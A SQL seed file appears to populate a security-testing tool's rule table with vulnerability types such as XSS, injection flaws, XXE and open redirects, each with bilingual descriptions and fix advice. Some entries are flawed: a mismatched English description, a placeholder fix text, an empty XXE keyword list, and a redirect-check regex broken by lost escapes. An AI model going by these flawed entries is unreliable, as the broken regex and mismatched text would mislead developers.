INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (12, 1, 'cookie-flags-missing', 3, 'disable', 1, 'Cookie未设置secure', '没有设置HTTPS会话中敏感cookie的安全属性，这可能导致用户代理通过HTTP会话以明文发送这些cookie。', '为cookie设置Secure属性\n代码如下：\n```java\nprivate void writeCookie(HttpServletResponse response, String name, String value, String domain, String path, int maxAge,boolean isSecure) {\nCookie cookie = new Cookie(name, value);\ncookie.setVersion(0);\ncookie.setPath(path);\ncookie.setSecure(isSecure);\nif (domain != null) {\ncookie.setDomain(domain);\n}\ncookie.setMaxAge(maxAge);\nresponse.addCookie(cookie);\n}\n```', 48, 'Verifies that cookies have the \'secure\' flag.', '没有设置HTTPS会话中敏感cookie的安全属性，这可能导致用户代理通过HTTP会话以明文发送这些cookie。', NULL, '为cookie设置Secure属性\n代码如下：\n```java\nprivate void writeCookie(HttpServletResponse response, String name, String value, String domain, String path, int maxAge,boolean isSecure) {\nCookie cookie = new Cookie(name, value);\ncookie.setVersion(0);\ncookie.setPath(path);\ncookie.setSecure(isSecure);\nif (domain != null) {\ncookie.setDomain(domain);\n}\ncookie.setMaxAge(maxAge);\nresponse.addCookie(cookie);\n}\n```', 'Cookie未设置secure', 'Cookie未设置secure', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (13, 1, 'trust-boundary-violation', 3, 'disable', 1, '信任边界', 'CWE-501，信任边界可以认为是通过程序绘制的线。 在生产线的一侧，数据不受信任。 在该行的另一端，假定数据是可信的。 验证逻辑的目的是允许数据安全地越过信任边界-从不受信任变为受信任。 当程序模糊了可信和不可信之间的界限时，就会发生信任边界冲突。 通过在同一数据结构中组合可信数据和不可信数据，程序员可以更容易地错误地信任未验证的数据。', '在开发阶段，增加验证逻辑，让数据安全地穿过信任边界，即从不受信任的一边移到受信任的一边。', 49, 'Verifies that untrusted data is not used in the HTTP session.', 'CWE-501，信任边界可以认为是通过程序绘制的线。 在生产线的一侧，数据不受信任。 在该行的另一端，假定数据是可信的。 验证逻辑的目的是允许数据安全地越过信任边界-从不受信任变为受信任。 当程序模糊了可信和不可信之间的界限时，就会发生信任边界冲突。 通过在同一数据结构中组合可信数据和不可信数据，程序员可以更容易地错误地信任未验证的数据。', NULL, '在开发阶段，增加验证逻辑，让数据安全地穿过信任边界，即从不受信任的一边移到受信任的一边。', '信任边界', '信任边界', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (14, 1, 'reflected-xss', 2, 'disable', 1, '反射型xss', '跨站脚本攻击漏洞简称XSS漏洞,主要是由于应用后端未对用户输入进行安全校验或校验不严格导致恶意用户可自定义控制页面输出内容，从而产生跨站脚本攻击漏洞。通常来说恶意用户通过构造闭合标签方式在HTML页面中插入Javascript代码，在正常用户浏览此页面时对正常用户进行攻击，常见的攻击方式有获取用户的身份凭据、对用户内网进行探测扫描、执行钓鱼欺骗攻击等', '对所有用户提交内容进行可靠的输入验证，包括对URL、查询关键字、HTTP头、REFER、POST数据等，仅接受 指定长度范围内、采用适当格式、采用所预期的字符的内容提交，对其他的一律过滤。尽量采用POST 而非GET 提交表单；对\"<\"，\">\",\";\",\"\'\"，\"javascript\"，\"jscript\"，\"vbscript\"等字符做过滤。\n\n1、在HTML/XML中显示\"\"用户可控数据\"\"前，应该进行html escape转义。\n\n2、在javascript内容中输出的\"\"用户可控数据\"\"，需要做javascript escape转义。\n\n3、对输出到富文本中的\"\"用户可控数据\"\"，做富文本安全过滤（允许用户输出HTML的情况）。\n\n4、输出在url中的数据，做url安全输出。', 50, 'Verifies that no untrusted data is used in generated HTML pages	.', '跨站脚本攻击漏洞简称XSS漏洞,主要是由于应用后端未对用户输入进行安全校验或校验不严格导致恶意用户可自定义控制页面输出内容，从而产生跨站脚本攻击漏洞。通常来说恶意用户通过构造闭合标签方式在HTML页面中插入Javascript代码，在正常用户浏览此页面时对正常用户进行攻击，常见的攻击方式有获取用户的身份凭据、对用户内网进行探测扫描、执行钓鱼欺骗攻击等', NULL, '对所有用户提交内容进行可靠的输入验证，包括对URL、查询关键字、HTTP头、REFER、POST数据等，仅接受 指定长度范围内、采用适当格式、采用所预期的字符的内容提交，对其他的一律过滤。尽量采用POST 而非GET 提交表单；对\"<\"，\">\",\";\",\"\'\"，\"javascript\"，\"jscript\"，\"vbscript\"等字符做过滤。\n\n1、在HTML/XML中显示\"\"用户可控数据\"\"前，应该进行html escape转义。\n\n2、在javascript内容中输出的\"\"用户可控数据\"\"，需要做javascript escape转义。\n\n3、对输出到富文本中的\"\"用户可控数据\"\"，做富文本安全过滤（允许用户输出HTML的情况）。\n\n4、输出在url中的数据，做url安全输出。', '反射型xss', '反射型xss', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (15, 1, 'header-injection', 3, 'enable', 1, 'Header头注入', 'HTTP响应拆分漏洞，也叫CRLF注入攻击。CR、LF分别对应回车、换行字符。攻击者可能注入自定义HTTP头。例如，攻击者可以注入会话cookie或HTML代码。这可能会进行类似的XSS（跨站点脚本）或会话固定漏洞。', '1、在设置HTTP响应头的代码中，过滤回车、换行（%0d，%0a，%0D，%0A)等字符，避免输入的数据污染到其他HTTP头。\n\n2、对参数做合法性校验以及长度限制。\n\n3、不对用户的输入直接输出；', 61, 'Verifies that untrusted data is not used in an HTTP header.', 'HTTP响应拆分漏洞，也叫CRLF注入攻击。CR、LF分别对应回车、换行字符。攻击者可能注入自定义HTTP头。例如，攻击者可以注入会话cookie或HTML代码。这可能会进行类似的XSS（跨站点脚本）或会话固定漏洞。', NULL, '1、在设置HTTP响应头的代码中，过滤回车、换行（%0d，%0a，%0D，%0A)等字符，避免输入的数据污染到其他HTTP头。\n\n2、对参数做合法性校验以及长度限制。\n\n3、不对用户的输入直接输出；', 'Header头注入', 'Header头注入', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (16, 1, 'hql-injection', 1, 'enable', 1, 'HQL注入', 'CWE-564，使用Hibernate执行使用用户控制的输入构建的动态SQL语句，可使攻击者修改该语句的含义或执行任意SQL命令。', '1、创建 SQL 数据库的用户帐户时遵循最小权限原则。用户应仅具有使用其帐户所需的最低权限。如果系统要求表明用户可以读取和修改自己的数据，则限制其权限，使其无法读取/写入他人的数据。\n\n2、对于在客户端执行的任何安全检查，请确保在服务器端重复这些检查，以避免CWE-602。攻击者可以通过在执行检查后修改值来绕过客户端检查，或者通过更改客户端以完全删除客户端检查。然后，这些修改后的值将提交给服务器。\n\n3、使用绑定变量的预准备语句实现 SQL 字符串。未绑定变量的准备好的语句可能容易受到攻击。', 56, 'Verifies that no untrusted data is appended to dynamically constructed hibernate queries.	', 'CWE-564，使用Hibernate执行使用用户控制的输入构建的动态SQL语句，可使攻击者修改该语句的含义或执行任意SQL命令。', NULL, '1、创建 SQL 数据库的用户帐户时遵循最小权限原则。用户应仅具有使用其帐户所需的最低权限。如果系统要求表明用户可以读取和修改自己的数据，则限制其权限，使其无法读取/写入他人的数据。\n\n2、对于在客户端执行的任何安全检查，请确保在服务器端重复这些检查，以避免CWE-602。攻击者可以通过在执行检查后修改值来绕过客户端检查，或者通过更改客户端以完全删除客户端检查。然后，这些修改后的值将提交给服务器。\n\n3、使用绑定变量的预准备语句实现 SQL 字符串。未绑定变量的准备好的语句可能容易受到攻击。', 'HQL注入', 'HQL注入', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (17, 1, 'unsafe-readline', 3, 'enable', 1, '不安全的readline', '使用不安全的方法进行行数据读取', '建议使用`org.apache.commons.io.input.BoundedInputStream`先对流进行大小限制，再使用`readLine`方法来规避安全风险\n\n```java\nInputStream in =new FileInputStream(new File(\"D:	est.txt\"));\nBoundedInputStream bis=new BoundedInputStream(in, 1010241024);//限制流的大小为10M,根据实际文件大小可调整\nInputStreamReader reader =new InputStreamReader(bis, \"UTF-8\");\nBufferedReader br=new BufferedReader(reader);\nString line =br.readLine();\n```', 58, 'Verifies that untrusted stream doesn\'t use readLine() method.', '使用不安全的方法进行行数据读取', NULL, '建议使用`org.apache.commons.io.input.BoundedInputStream`先对流进行大小限制，再使用`readLine`方法来规避安全风险\n\n```java\nInputStream in =new FileInputStream(new File(\"D:	est.txt\"));\nBoundedInputStream bis=new BoundedInputStream(in, 1010241024);//限制流的大小为10M,根据实际文件大小可调整\nInputStreamReader reader =new InputStreamReader(bis, \"UTF-8\");\nBufferedReader br=new BufferedReader(reader);\nString line =br.readLine();\n```', '不安全的readline', '不安全的readline', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (18, 1, 'expression-language-injection', 1, 'enable', 1, '表达式注入', 'CWE-917，该软件使用来自上游组件的外部影响的输入来构造Java Server Page（JSP）中的全部或部分表达语言（EL）语句，但不会中和或错误地中和了可以修改预期的EL语句的特殊元素。它被执行。', '1、尽量避免使用外部输入的内容作为EL表达式内容\n\n2、通过参数白名单或者黑名单控制参数的合法性\n\n3、如果涉及到执行表达式的方法传入的参数外部可控，就存在表达式注入的安全风险，需要通过白名单参数校验来限制。\n如果是java程序，需搜索检查如下关键类方法\n```java\nel.ExpressionFactory.createValueExpression()\njavax.el.ValueExpression.getValue()\n```\n指定正确EvaluationContext（针对SpEL表达式注入）\n\nSpring官方推出了SimpleEvaluationContext作为安全类来防御该类漏洞，SimpleEvaluationContext旨在仅支持SpEL语言语法的一个子集。它不包括 Java类型引用，构造函数和bean引用，指定正确EvaluationContext，是防止SpEl表达式注入漏洞产生的首选。', 52, 'Verifies that untrusted data is not used in the evaluation of JSP Expression Language.	', 'CWE-917，该软件使用来自上游组件的外部影响的输入来构造Java Server Page（JSP）中的全部或部分表达语言（EL）语句，但不会中和或错误地中和了可以修改预期的EL语句的特殊元素。它被执行。', NULL, '1、尽量避免使用外部输入的内容作为EL表达式内容\n\n2、通过参数白名单或者黑名单控制参数的合法性\n\n3、如果涉及到执行表达式的方法传入的参数外部可控，就存在表达式注入的安全风险，需要通过白名单参数校验来限制。\n如果是java程序，需搜索检查如下关键类方法\n```java\nel.ExpressionFactory.createValueExpression()\njavax.el.ValueExpression.getValue()\n```\n指定正确EvaluationContext（针对SpEL表达式注入）\n\nSpring官方推出了SimpleEvaluationContext作为安全类来防御该类漏洞，SimpleEvaluationContext旨在仅支持SpEL语言语法的一个子集。它不包括 Java类型引用，构造函数和bean引用，指定正确EvaluationContext，是防止SpEl表达式注入漏洞产生的首选。', '表达式注入', '表达式注入', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (19, 1, 'redos', 3, 'enable', 1, '正则DOS', 'CWE-185，使用的正则表达式会导致数据不正确的匹配或比较，造成程序响应速度变慢', '不要将不可信赖的数据用作正则表达式', 53, 'Verifies that no heavily backtracking regular expressions are used on untrusted data.	', 'CWE-185，使用的正则表达式会导致数据不正确的匹配或比较，造成程序响应速度变慢', NULL, '不要将不可信赖的数据用作正则表达式', '正则DOS', '正则DOS', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (20, 1, 'reflection-injection', 1, 'enable', 1, '反射注入', '使用反射方式动态加载用户输入的类名，如果未做过滤，可加载恶意类产生命令执行等风险。', '1、重构代码以避免使用反射;\n\n2、尽量避免使用用户控制的输入来选择和加载类或代码。', 54, 'Verifies that untrusted data is not used in a reflection API.', '使用反射方式动态加载用户输入的类名，如果未做过滤，可加载恶意类产生命令执行等风险。', NULL, '1、重构代码以避免使用反射;\n\n2、尽量避免使用用户控制的输入来选择和加载类或代码。', '反射注入', '反射注入', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (21, 1, 'nosql-injection', 1, 'enable', 1, 'NoSql注入', 'NoSQL(泛指非关系型的数据库)注入是指服务端充分信任用户输入导致输入带入查询操作，导致用户可控制数据库查询语句；但由于nosql数据库不同于传统数据库的语法，由于各个数据库之间使用语法、API一般不同，NoSQL注入攻击可能在应用程序的不同区域执行，具体取决于使用的NoSQL API和数据模型；NoSQL注入按照攻击途径又分五类：重言式/永真式、联合查询、JavaScript注入、背负式查询、跨域违规；', '为了避免 NoSQL 注入，必须始终将用户输入视为不受信任，可以执行以下操作：\n使用 sanitization library 。例如，mongo-sanitize 或 mongoose。\n\n如果找不到适合您环境的库，请将用户输入转换为所需的类型。\n\n例如，将用户名和密码转换为字符串。\n\n在 MongoDB 的情况下，切勿在用户输入中使用 where，mapReduce 或 group 运算符，因为这些运算符使攻击者能够注入 JavaScript，因此比其他运算符更加危险。为了加强安全性，在 mongod.conf 如果可能的话，设置 javascriptEnabled 为 false。\n\n此外，请始终使用最小特权模型：以尽可能低的特权运行您的应用程序，以便即使被利用，攻击者也无法访问其他资源', 57, 'Verifies that no untrusted data is used in dynamic database queries.	', 'NoSQL(泛指非关系型的数据库)注入是指服务端充分信任用户输入导致输入带入查询操作，导致用户可控制数据库查询语句；但由于nosql数据库不同于传统数据库的语法，由于各个数据库之间使用语法、API一般不同，NoSQL注入攻击可能在应用程序的不同区域执行，具体取决于使用的NoSQL API和数据模型；NoSQL注入按照攻击途径又分五类：重言式/永真式、联合查询、JavaScript注入、背负式查询、跨域违规；', NULL, '为了避免 NoSQL 注入，必须始终将用户输入视为不受信任，可以执行以下操作：\n使用 sanitization library 。例如，mongo-sanitize 或 mongoose。\n\n如果找不到适合您环境的库，请将用户输入转换为所需的类型。\n\n例如，将用户名和密码转换为字符串。\n\n在 MongoDB 的情况下，切勿在用户输入中使用 where，mapReduce 或 group 运算符，因为这些运算符使攻击者能够注入 JavaScript，因此比其他运算符更加危险。为了加强安全性，在 mongod.conf 如果可能的话，设置 javascriptEnabled 为 false。\n\n此外，请始终使用最小特权模型：以尽可能低的特权运行您的应用程序，以便即使被利用，攻击者也无法访问其他资源', 'NoSql注入', 'NoSql注入', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (22, 1, 'unvalidated-redirect', 3, 'enable', 1, '不安全的重定向', 'CWE-601，Web应用程序接受用户控制的输入，该输入指定到外部站点的链接，并在重定向中使用该链接，简化了网络钓鱼攻击。', '1、若跳转的URL事先是可以确定的，包括url和参数的值，则可以在后台先配置好，url参数只需传对应url的索引即可，通过索引找到对应具体url再进行跳转；\n\n2、若跳转的URL事先不确定，但其输入是由后台生成的（不是用户通过参数传人），则可以先生成好跳转链接然后进行签名，而跳转cg首先需要进行验证签名通过才能进行跳转；\n\n3、若1和2都不满足，url事先无法确定，只能通过前端参数传入，则必须在跳转的时候对url进行按规则校验：\n即控制url是否是公司授权的白名单或者是符合公司规则的url，参考代码：\n```\nfunction checkURL (sURL) {\nreturn (/^(https?://)?[w-.]+.(yourDomainA|yourDomainB|yourDomainC).com($|/|)/i).test\n(sUrl)||(/^[w][w/.-_%]+$/i).test(sUrl)||(/^[/][^/\\]/i).test(sUrl) ? true : false;\n}\n```\n\n4、通过对referer的限制：如果确定传递URL参数进入的来源，我们可以通过该方式实现安全限制，保证该URL的有效性，避免恶意用户自己生成跳转链接；\n\n5、加入有效性验证Token：我们保证所有生成的链接都是来自于我们可信域的，通过在生成的链接里加入用户不可控的Token对生成的链接进行校验，可以避免用户生成自己的恶意链接从而被利用，在跳转时做判断，指定跳转的值。当用户访问需要跳转URL的页面时，生成随机token，并保存到Cookie中，后台应用程序在跳转前，判断token是否和cookie中的token一致。\n\n6、理论上讲，url跳转属于CSRF的一种，跳转url检测中也加入了CRLF头部注入漏洞的检测逻辑, 具体就是在请求参数中加入了%0d%0a这种测试代码，需要对这些参数进行删除处理(事实上：在判断到一个参数中包含 %00 -> %1f 的控制字符时都是不合法的，需对其进行删除)。\n\n7、如果为struts2重定向漏洞，则需要更新相关的struts2的版本到最新。', 60, 'Verifies that requests are not redirected using untrusted data.', 'CWE-601，Web应用程序接受用户控制的输入，该输入指定到外部站点的链接，并在重定向中使用该链接，简化了网络钓鱼攻击。', NULL, '1、若跳转的URL事先是可以确定的，包括url和参数的值，则可以在后台先配置好，url参数只需传对应url的索引即可，通过索引找到对应具体url再进行跳转；\n\n2、若跳转的URL事先不确定，但其输入是由后台生成的（不是用户通过参数传人），则可以先生成好跳转链接然后进行签名，而跳转cg首先需要进行验证签名通过才能进行跳转；\n\n3、若1和2都不满足，url事先无法确定，只能通过前端参数传入，则必须在跳转的时候对url进行按规则校验：\n即控制url是否是公司授权的白名单或者是符合公司规则的url，参考代码：\n```\nfunction checkURL (sURL) {\nreturn (/^(https?://)?[w-.]+.(yourDomainA|yourDomainB|yourDomainC).com($|/|)/i).test\n(sUrl)||(/^[w][w/.-_%]+$/i).test(sUrl)||(/^[/][^/\\]/i).test(sUrl) ? true : false;\n}\n```\n\n4、通过对referer的限制：如果确定传递URL参数进入的来源，我们可以通过该方式实现安全限制，保证该URL的有效性，避免恶意用户自己生成跳转链接；\n\n5、加入有效性验证Token：我们保证所有生成的链接都是来自于我们可信域的，通过在生成的链接里加入用户不可控的Token对生成的链接进行校验，可以避免用户生成自己的恶意链接从而被利用，在跳转时做判断，指定跳转的值。当用户访问需要跳转URL的页面时，生成随机token，并保存到Cookie中，后台应用程序在跳转前，判断token是否和cookie中的token一致。\n\n6、理论上讲，url跳转属于CSRF的一种，跳转url检测中也加入了CRLF头部注入漏洞的检测逻辑, 具体就是在请求参数中加入了%0d%0a这种测试代码，需要对这些参数进行删除处理(事实上：在判断到一个参数中包含 %00 -> %1f 的控制字符时都是不合法的，需对其进行删除)。\n\n7、如果为struts2重定向漏洞，则需要更新相关的struts2的版本到最新。', '不安全的重定向', '不安全的重定向', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (23, 1, 'unvalidated-forward', 3, 'enable', 1, '不安全的转发', '验证服务端是否使用不受信任的数据链接进行重定向。', '1、尽量避免使用转发机制，如果使用了，那么在定义目标URL的时候不要包含用户参数。\n\n2、如果一定要保护用户输入的参数，那么：\n\n对每个参数都必须进行验证以确保它的合法性和正确性，或是在服务端提供映射机制，将用户的选择参数转变为真正的白名单目标页面', 59, 'Verifies that no untrusted data is used to build a path used in forwards.	', '验证服务端是否使用不受信任的数据链接进行重定向。', NULL, '1、尽量避免使用转发机制，如果使用了，那么在定义目标URL的时候不要包含用户参数。\n\n2、如果一定要保护用户输入的参数，那么：\n\n对每个参数都必须进行验证以确保它的合法性和正确性，或是在服务端提供映射机制，将用户的选择参数转变为真正的白名单目标页面', '不安全的转发', '不安全的转发', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (24, 1, 'crypto-bad-ciphers', 3, 'disable', 1, '弱加密算法', '数据通过弱加密算法MessageDigest函数进行加密', 'DES等加密算法和 MD5、SHA1及RIPEMD160等哈希算法被视为弱加密算法。与更现代的加密算法相比，加密算法 DES 提供的安全位数更少。推荐使用更强大的加密方式，对于 DES 加密，请使用 Aes、SM4、SM7等加密。对于 SHA1 或 RIPEMD160 哈希函数，请使用SHA-2系列（例如SHA512、SHA384、SHA256），或SM3。', 47, 'Verifies that no untrusted data is used to build a path used in forwards.	', '数据通过弱加密算法MessageDigest函数进行加密', NULL, 'DES等加密算法和 MD5、SHA1及RIPEMD160等哈希算法被视为弱加密算法。与更现代的加密算法相比，加密算法 DES 提供的安全位数更少。推荐使用更强大的加密方式，对于 DES 加密，请使用 Aes、SM4、SM7等加密。对于 SHA1 或 RIPEMD160 哈希函数，请使用SHA-2系列（例如SHA512、SHA384、SHA256），或SM3。', '弱加密算法', '弱加密算法', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (25, 1, 'dynamic-library-load', 1, 'enable', 1, 'JNI注入', 'JNI注入是指由于WEB应用程序对用户提交的JNI包过滤不严格，导致攻击者可以通过构造恶意JNI包并动态加载至WEB应用中', '1、围绕JNI调用实现错误处理，如果使用不受信任的本机库，尽量不使用JNI调用，可调用功能相近的Java API\n\n2、出现JNI漏洞说明服务器可能存在代码执行漏洞，请检查漏洞的位置并限制执行代码的功能。', 62, 'Verifies that use of the Java Runtiom load is not done with untrusted data.', 'JNI注入是指由于WEB应用程序对用户提交的JNI包过滤不严格，导致攻击者可以通过构造恶意JNI包并动态加载至WEB应用中', '这里是修复建议', '1、围绕JNI调用实现错误处理，如果使用不受信任的本机库，尽量不使用JNI调用，可调用功能相近的Java API\n\n2、出现JNI漏洞说明服务器可能存在代码执行漏洞，请检查漏洞的位置并限制执行代码的功能。', 'JNI注入', 'JNI注入', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (26, 1, 'xxe', 2, 'enable', 1, 'XXE', 'XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。\n\nXML外部实体注入（XML External Entity Injection）漏洞是指当恶意用户在提交一个精心构造的包含外部实体引用的XML文档给未正确配置的XML解析器处理时，该攻击就会发生。', '1、使用语言中推荐的禁用外部实体的方法\n\nPHP：\n```php\nlibxml_disable_entity_loader(true);\n```\nJAVA:\n```java\nDocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();\ndbf.setExpandEntityReferences(false);\n.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\",true);\n.setFeature(\"http://xml.org/sax/features/external-general-entities\",false)\n.setFeature(\"http://xml.org/sax/features/external-parameter-entities\",false);\n```\nPython：\n```python\nfrom lxml import etree\nxmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))\n```\n2、手动黑名单过滤(不推荐)\n过滤关键词：', 51, 'Verifies that external entities aren\'t processed during XML.\nXML外部实体注入（XML External Entity Injection）漏洞是指当恶意用户在提交一个精心构造的包含外部实体引用的XML文档给未正确配置的XML解析器处理时，该攻击就会发生。', 'XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。\n\nXML外部实体注入（XML External Entity Injection）漏洞是指当恶意用户在提交一个精心构造的包含外部实体引用的XML文档给未正确配置的XML解析器处理时，该攻击就会发生。', NULL, '1、使用语言中推荐的禁用外部实体的方法\n\nPHP：\n```php\nlibxml_disable_entity_loader(true);\n```\nJAVA:\n```java\nDocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();\ndbf.setExpandEntityReferences(false);\n.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\",true);\n.setFeature(\"http://xml.org/sax/features/external-general-entities\",false)\n.setFeature(\"http://xml.org/sax/features/external-parameter-entities\",false);\n```\nPython：\n```python\nfrom lxml import etree\nxmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))\n```\n2、手动黑名单过滤(不推荐)\n过滤关键词：', 'XXE', 'XXE', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (27, 1, 'unsafe-json-deserialize', 1, 'enable', 1, '不安全的JSON反序列化', '不安全的JSON反序列化是指WEB应用程序对用户提交的反序列化数据未进行有效过滤，导致反序列化过程中产生命令执行、文件读取等漏洞', '将用户提供的数据写入 JSON 时，应该遵守以下准则：\n\n1、不要创建名称来自用户输入的 JSON 属性。\n\n2、确保使用安全的序列化函数（能够以单引号或双引号分隔不可信赖的数据，并且避免任何特殊字符）执行对 JSON 的所有序列化操作。', 55, 'Verifies that objects aren\'t deserialized from untrusted sources.', '不安全的反序列化是指WEB应用程序对用户提交的反序列化数据未进行有效过滤，导致反序列化过程中产生命令执行、文件读取等漏洞', NULL, '将用户提供的数据写入 JSON 时，应该遵守以下准则：\n\n1、不要创建名称来自用户输入的 JSON 属性。\n\n2、确保使用安全的序列化函数（能够以单引号或双引号分隔不可信赖的数据，并且避免任何特殊字符）执行对 JSON 的所有序列化操作。', '不安全的JSON反序列化', '不安全的反序列化', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (28, 1, 'Response Without Content-Security-Policy Header', 5, 'enable', 1, 'Response Without Content-Security-Policy Header', 'Verifies that the requests sent by the application have the Content-Security-Policy or Content-Security-Policy-Read-Only header set.        ', '将服务器配置为使用安全策略的“Content-Security-Policy”头。\n在web.config 配置文件中添加如下HTTP响应头：\n```\n　<system.webServer>\n        ?\n　　<add name=\"Content-Security-Policy\" value=\"default-src \'self\';\"/>\n　　</system.webServer>\n```\n使用meta标签：\n```\n　<meta http-equiv=”Content-Security-Policy” content=”default-src \'self\'”/>\n```', 132, 'Verifies that the requests sent by the application have the Content-Security-Policy or Content-Security-Policy-Read-Only header set.        ', 'Response Without Content-Security-Policy Header', NULL, '将服务器配置为使用安全策略的“Content-Security-Policy”头。\n在web.config 配置文件中添加如下HTTP响应头：\n```\n　<system.webServer>\n        ?\n　　<add name=\"Content-Security-Policy\" value=\"default-src \'self\';\"/>\n　　</system.webServer>\n```\n使用meta标签：\n```\n　<meta http-equiv=”Content-Security-Policy” content=”default-src \'self\'”/>\n```', 'Response Without Content-Security-Policy Header', 'Response Without Content-Security-Policy Header', 1);
